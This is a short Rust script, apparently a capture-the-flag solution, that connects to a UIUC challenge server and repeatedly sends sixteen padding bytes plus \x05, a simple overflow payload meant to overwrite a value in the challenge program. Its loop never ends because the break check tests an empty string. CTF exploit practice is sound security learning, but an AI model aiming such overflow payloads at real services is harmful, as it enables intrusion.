extern crate bufstream;
use std::net::TcpStream;
use bufstream::BufStream;

// Traits
use std::io::BufRead;
use std::io::Write;


fn main() {
    if let Ok(stream) = TcpStream::connect("challenge.uiuc.tf:11343") {
        let mut buffer = BufStream::new(stream);
        loop {
            let mut output = String::new();
            if output == " " {
                break;
            } else {
                buffer.read_line(&mut output).unwrap();
                buffer.write_all(b"aaaaaaaaaaaaaaaa\x05").unwrap();
                buffer.flush().unwrap();
                print!("{}", output);
            }
        }
    } else {
        println!("[!] Unable to connect!");
    }
}
